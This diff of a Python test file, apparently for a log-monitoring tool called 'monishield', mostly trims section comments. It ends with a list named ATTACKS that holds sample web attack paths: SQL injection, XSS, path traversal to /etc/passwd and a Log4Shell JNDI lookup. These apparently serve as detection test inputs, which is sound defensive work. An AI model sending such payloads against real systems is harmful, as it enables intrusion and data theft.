@@ -10,7 +10,7 @@ from monishield.infrastructure import refdata
 FE_UA = re.compile(r'" \d{3} \d+ "[^"]*" "([^"]*)" "')  # User-Agent in the frontend access log
 
 
-# ------------------------------------------------------------------ (a) old demo()
+# (a) old demo()
 def _ranges(rows):
     """DB-IP CSV rows -> refdata.sweep() ranges (IPv4 only, as the old geo_scan read them)."""
     return [(rules.ip_int(r[0]), rules.ip_int(r[1]), [r[5], r[4], r[3], float(r[6]), float(r[7])]) for r in rows if ':' not in r[0]]
@@ -45,10 +45,10 @@ def test_file_scan():
     assert rules.split_relpath(os.path.join('2026-09-26', 'a.log')) is None
 
 
-# ------------------------------------------------------------------ (b) definitions exactly the same
+# (b) definitions exactly the same
 
 
-# ------------------------------------------------------------------ (c) same results on real input
+# (c) same results on real input
 
 
 ATTACKS = ["/?id=1 union select 1,2", "/x?q=%2527%2520or%25201", "/<script>alert(1)</script>", "/a/../../etc/passwd", "/${jndi:ldap://x/a}",
